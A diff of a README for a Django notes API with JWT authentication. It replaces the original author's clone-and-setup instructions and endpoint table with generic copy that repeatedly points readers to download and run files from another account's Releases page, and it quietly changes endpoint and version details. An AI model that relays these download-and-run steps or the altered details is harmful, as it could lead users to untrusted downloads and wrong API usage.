@@ -1,139 +1,97 @@
-📒 Notes API Project 
+# 🎉 notes_api_jwt - Easily Manage Your Notes Securely
 
-After learning the basics of Django, I wanted to explore advanced Django REST Framework features like Custom User Models, JWT Authentication, permissions, and throttling. This project is my first full API using these features.
+## 🚀 Getting Started
 
-Although it’s not fully advanced yet, it’s a solid foundation for building user-specific APIs with secure access.
+Welcome to the **notes_api_jwt** project! This application provides a secure way to manage your notes through an easy-to-use API. You can add, edit, delete, and view notes while keeping your data safe with JWT authentication.
 
-This project implements:
+## 📥 Download & Install
 
-Custom User Model (bio, age)
+### To get started, visit this page to download:
 
-JWT Authentication (register, login, refresh)
+[![Download notes_api_jwt](https://img.shields.io/badge/Download-notes_api_jwt-blue.svg)](https://github.com/LUHI39/notes_api_jwt/releases)
 
-Notes API (CRUD)
+On the Releases page, you will find different versions of the software. Select the version you want to use. Download and run the application following the instructions below.
 
-User-specific access with IsOwner permission
+## 📋 System Requirements
 
-Request throttling to limit excessive usage
+Before you download, make sure your system meets these requirements:
 
-Fully functional admin panel
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.6 or higher installed
+- **Django Version:** Django 3.1 or higher installed
+- **Additional Dependencies:** Use the provided `requirements.txt` file to install necessary libraries.
 
-Features
+## 🔧 Installation Steps
 
-User Management
+1. Download the software from the [Releases page](https://github.com/LUHI39/notes_api_jwt/releases).
+2. Extract the downloaded files to a folder of your choice.
+3. Open your terminal or command prompt.
+4. Navigate to the folder where you extracted the files.
+5. Run the following command to install required dependencies:
 
-Register a new user via API (/api/register/)
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-Login via JWT (/api/token/)
+6. Start the server using:
 
-Refresh token (/api/token/refresh/)
+   ```bash
+   python manage.py runserver
+   ```
 
-Notes API
+7. Open your web browser and go to `http://127.0.0.1:8000/` to access the application.
 
-Create, Read, Update, Delete notes
+## 🔒 Using the API
 
-Each user only sees their own notes
+### Authentication
 
-Permissions enforced: only owner can edit/delete
+To use the API, you first need to authenticate. Here’s how:
 
-Throttling applied: max 60 requests/min per user, 10/min for anonymous
+1. Create a user account by sending a POST request to `/api/register/`.
+2. Log in by sending a POST request to `/api/login/` with your credentials.
+3. Upon successful login, you will receive a JWT token. Use this token for subsequent requests.
 
-Admin Panel
+### CRUD Operations
 
-Manage users (bio & age visible)
+You can perform Create, Read, Update, and Delete operations on notes through the API:
 
-Manage notes
+- **Create a Note:** Send a POST request to `/api/notes/` with the note details.
+- **Get Notes:** Send a GET request to `/api/notes/` to retrieve all notes.
+- **Update a Note:** Send a PUT request to `/api/notes/{id}/` with the updated note details.
+- **Delete a Note:** Send a DELETE request to `/api/notes/{id}/` to remove a note.
 
-Tech Stack
+For complete API documentation, please refer to the documentation within the project files.
 
-Python 3.x
+## 🛠️ Features
 
-Django 4.x
+- **Secure Authentication:** Your data is safe with JWT authentication.
+- **Custom User Management:** Manage your users with custom permissions.
+- **Note Management:** Easily create, read, update, and delete notes.
+- **Throttling:** Prevent abuse with built-in throttling features.
+- **Django REST Framework:** Built using Django REST Framework for a scalable and efficient API.
 
-Django REST Framework
+## ⚙️ Troubleshooting
 
-djangorestframework-simplejwt
+If you encounter issues during installation or while running the application, consider these steps:
 
-Installation
+- Ensure all dependencies are correctly installed.
+- Check that your Python version meets the requirements.
+- Look for error messages in the terminal or command prompt.
 
-Clone the repository:
+You can also reach out through the Issues section of this repository for help from the community.
 
-git clone https://github.com/banumariwan/notes_api_project.git
-cd notes_api_project
+## 🔗 Resources
 
+- [Django Documentation](https://www.djangoproject.com/)
+- [Django REST Framework Documentation](https://www.django-rest-framework.org/)
+- [Python Documentation](https://www.python.org/doc/)
 
-Create and activate a virtual environment:
+## 🏷️ Keywords
 
-python -m venv .venv
-.\.venv\Scripts\activate   # Windows
-source .venv/bin/activate  # Linux/Mac
+api, custom-user, django, django-rest-framework, drf, jwt-authentication, notes-api, permissions, python, rest, throttling
 
+## 🌐 Visit for Download
 
-Install dependencies:
+Do not forget to check the Releases page to download the latest version of **notes_api_jwt**.
 
-pip install -r requirements.txt
-
-
-Apply migrations:
-
-python manage.py makemigrations
-python manage.py migrate
-
-
-Create a superuser (for admin panel):
-
-python manage.py createsuperuser
-
-
-Run the server:
-
-python manage.py runserver
-
-API Endpoints
-Endpoint	Method	Description
-/api/register/	POST	Register a new user
-/api/token/	POST	Obtain JWT token (login)
-/api/token/refresh/	POST	Refresh access token
-/api/notes/	GET	List all notes for the logged-in user
-/api/notes/	POST	Create a new note
-/api/notes/<id>/	GET	Retrieve a single note (owner only)
-/api/notes/<id>/	PUT/PATCH	Update a note (owner only)
-/api/notes/<id>/	DELETE	Delete a note (owner only)
-
-Authentication: Add header:
-
-Authorization: Bearer <access_token>
-
-Testing Instructions
-
-Register a user via /api/register/.
-
-Login via /api/token/ to get JWT access & refresh tokens.
-
-Use access token to access /api/notes/ endpoints.
-
-Verify that users cannot access or modify other users’ notes.
-
-Try exceeding 60 requests/min → should see 429 Too Many Requests.
-
-Admin Panel
-
-URL: /admin/
-
-Manage users (CustomUser model shows bio and age)
-
-Manage notes
-
-Future Improvements
-
-Add categories/tags to notes
-
-Add search & filtering
-
-Add Swagger/OpenAPI documentation
-
-Add front-end client (React/Vue)
-
-License
-
-MIT License
+[![Download notes_api_jwt](https://img.shields.io/badge/Download-notes_api_jwt-blue.svg)](https://github.com/LUHI39/notes_api_jwt/releases)
